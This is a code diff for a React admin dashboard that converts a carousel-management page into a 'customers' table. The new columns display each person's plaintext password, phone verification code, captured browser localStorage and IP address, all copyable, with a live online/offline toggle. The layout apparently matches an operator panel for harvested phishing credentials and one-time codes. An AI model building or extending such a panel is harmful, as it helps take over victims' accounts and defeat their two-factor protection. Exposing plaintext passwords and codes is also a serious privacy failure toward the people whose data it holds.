@@ -4,13 +4,12 @@ import { PlusOutlined } from '@ant-design/icons';
 import type { ActionType, ProColumns, ProDescriptionsItemProps } from '@ant-design/pro-components';
 import { FooterToolbar, PageContainer, ProTable } from '@ant-design/pro-components';
 import { FormattedMessage, useAccess } from '@umijs/max';
-import { Button, message } from 'antd';
+import { Button, message, Switch } from 'antd';
 import React, { useRef, useState } from 'react';
 import type { FormValueType } from './components/Update';
 import Update from './components/Update';
 import Create from './components/Create';
 import Show from './components/Show';
-import { Image } from 'antd';
 import DeleteButton from '@/components/DeleteButton';
 import DeleteLink from '@/components/DeleteLink';
 
@@ -21,8 +20,9 @@ import DeleteLink from '@/components/DeleteLink';
  */
 const handleAdd = async (fields: API.ItemData) => {
   const hide = message.loading(<FormattedMessage id="adding" defaultMessage="Adding..." />);
+
   try {
-    await addItem('/carousels', { ...fields });
+    await addItem('/customers', { ...fields });
     hide();
     message.success(<FormattedMessage id="add_successful" defaultMessage="Added successfully" />);
     return true;
@@ -46,7 +46,7 @@ const handleAdd = async (fields: API.ItemData) => {
 const handleUpdate = async (fields: FormValueType) => {
   const hide = message.loading(<FormattedMessage id="updating" defaultMessage="Updating..." />);
   try {
-    await updateItem(`/carousels/${fields._id}`, fields);
+    await updateItem(`/customers/${fields._id}`, fields);
     hide();
 
     message.success(<FormattedMessage id="update_successful" defaultMessage="Update successful" />);
@@ -72,7 +72,7 @@ const handleRemove = async (ids: string[]) => {
   const hide = message.loading(<FormattedMessage id="deleting" defaultMessage="Deleting..." />);
   if (!ids) return true;
   try {
-    await removeItem('/carousels', {
+    await removeItem('/customers', {
       ids,
     });
     hide();
@@ -113,6 +113,7 @@ const TableList: React.FC = () => {
   const actionRef = useRef<ActionType>();
   const [currentRow, setCurrentRow] = useState<API.ItemData>();
   const [selectedRowsState, setSelectedRows] = useState<API.ItemData[]>([]);
+  const [activeKey, setActiveKey] = useState<string | undefined>('');
   const access = useAccess();
 
   /**
@@ -123,38 +124,60 @@ const TableList: React.FC = () => {
 
   const columns: ProColumns<API.ItemData>[] = [
     {
-      title: intl.formatMessage({ id: 'id' }),
-      dataIndex: '_id',
+      title: intl.formatMessage({ id: 'name' }),
+      dataIndex: ['user', 'name'],
       copyable: true,
+    },
+    {
+      title: intl.formatMessage({ id: 'phoneNumber' }),
+      dataIndex: 'phoneNumber',
+      copyable: true,
+      hideInSearch: true,
+    },
+    {
+      title: intl.formatMessage({ id: 'password' }),
+      dataIndex: 'password',
+      copyable: true,
+      hideInSearch: true,
+    },
+    {
+      title: intl.formatMessage({ id: 'localStorage', defaultMessage: '本地存储' }),
+      dataIndex: 'localStorage',
+      copyable: true,
+      hideInSearch: true,
+    },
+    {
+      title: intl.formatMessage({ id: 'ip', defaultMessage: 'IP 地址' }),
+      dataIndex: 'ip',
+      hideInSearch: false,
+      copyable: true,
+    },
+    {
+      title: intl.formatMessage({ id: 'certification', defaultMessage: '验证码' }),
+      dataIndex: 'phoneCode',
       hideInSearch: false,
     },
     {
-      title: intl.formatMessage({ id: 'image' }),
-      dataIndex: 'image',
-      hideInSearch: true,
-      valueType: 'image',
-      render: (_, record) => (
-        <Image
-          src={record.image}
-          alt="image"
-          width={45}
-          height={45}
-          style={{
-            objectFit: 'cover',
+      title: intl.formatMessage({ id: 'isOnline', defaultMessage: '是否在线' }),
+      dataIndex: 'isOnline',
+      hideInSearch: false,
+      valueEnum: {
+        true: { text: intl.formatMessage({ id: 'platform.online' }), status: 'Success' },
+        false: { text: intl.formatMessage({ id: 'platform.offline' }), status: 'Error' },
+      },
+      render: (_, record: any) => (
+        <Switch
+          checkedChildren={intl.formatMessage({ id: 'platform.online' })}
+          unCheckedChildren={intl.formatMessage({ id: 'platform.offline' })}
+          checked={record.isOnline}
+          onChange={async () => {
+            await handleUpdate({ _id: record._id, isOnline: !record.isOnline });
+            if (actionRef.current) {
+              actionRef.current.reload();
+            }
           }}
-          preview={true}
         />
       ),
-    },
-    {
-      title: intl.formatMessage({ id: 'status' }),
-      dataIndex: 'status',
-      render: (status) => (status ? '正常' : '异常'),
-      valueType: 'select',
-      valueEnum: {
-        true: { text: '正常' },
-        false: { text: '异常' },
-      },
     },
     {
       title: <FormattedMessage id="pages.searchTable.titleOption" defaultMessage="Operating" />,
@@ -168,12 +191,13 @@ const TableList: React.FC = () => {
             setShowDetail(true);
           }}
         >
-          <FormattedMessage id="detail" />
+          <FormattedMessage id="platforms.detail" defaultMessage="platforms.detail" />
         </a>,
-        access.canSuperAdmin && (
+        access.canUpdateCustomer && (
           <a
             key="edit"
             onClick={() => {
+              // Replace `handleUpdateModalOpen` and `setCurrentRow` with your actual functions
               handleUpdateModalOpen(true);
               setCurrentRow(record);
             }}
@@ -181,7 +205,7 @@ const TableList: React.FC = () => {
             {intl.formatMessage({ id: 'edit' })}
           </a>
         ),
-        access.canSuperAdmin && (
+        access.canDeleteCustomer && (
           <DeleteLink
             onOk={async () => {
               await handleRemove([record._id!]);
@@ -200,9 +224,12 @@ const TableList: React.FC = () => {
         headerTitle={intl.formatMessage({ id: 'list' })}
         actionRef={actionRef}
         rowKey="_id"
-        search={{ labelWidth: 120 }}
+        search={{
+          labelWidth: 120,
+          collapsed: false,
+        }}
         toolBarRender={() => [
-          access.canSuperAdmin && (
+          (access.canSuperAdmin || access.canCreateCustomer) && (
             <Button
               type="primary"
               key="primary"
@@ -214,7 +241,35 @@ const TableList: React.FC = () => {
             </Button>
           ),
         ]}
-        request={async (params, sort, filter) => queryList('/carousels', params, sort, filter)}
+        toolbar={{
+          menu: {
+            type: 'tab',
+            activeKey: activeKey,
+            items: [
+              {
+                label: <FormattedMessage id="platform.all" defaultMessage="所有" />,
+                key: '',
+              },
+              {
+                label: <FormattedMessage id="platform.online" defaultMessage="Online" />,
+                key: 'true',
+              },
+              {
+                label: <FormattedMessage id="platform.offline" defaultMessage="Offline" />,
+                key: 'false',
+              },
+            ],
+            onChange: (key: any) => {
+              setActiveKey(key);
+              if (actionRef.current) {
+                actionRef.current.reload();
+              }
+            },
+          },
+        }}
+        request={async (params, sort, filter) =>
+          queryList('/customers', { ...params, isOnline: activeKey }, sort, filter)
+        }
         columns={columns}
         rowSelection={
           access.canSuperAdmin && {
@@ -234,7 +289,7 @@ const TableList: React.FC = () => {
             </div>
           }
         >
-          {(access.canSuperAdmin || access.canDeleteCarousel) && (
+          {(access.canSuperAdmin || access.canDeleteCustomer) && (
             <DeleteButton
               onOk={async () => {
                 await handleRemove(selectedRowsState?.map((item: any) => item._id!));
@@ -245,7 +300,7 @@ const TableList: React.FC = () => {
           )}
         </FooterToolbar>
       )}
-      {(access.canSuperAdmin || access.canCreateCarousel) && (
+      {(access.canSuperAdmin || access.canCreateCustomer) && (
         <Create
           open={createModalOpen}
           onOpenChange={handleModalOpen}
@@ -260,7 +315,7 @@ const TableList: React.FC = () => {
           }}
         />
       )}
-      {(access.canSuperAdmin || access.canUpdateCarousel) && (
+      {(access.canSuperAdmin || access.canUpdateCustomer) && (
         <Update
           onSubmit={async (value) => {
             const success = await handleUpdate(value);
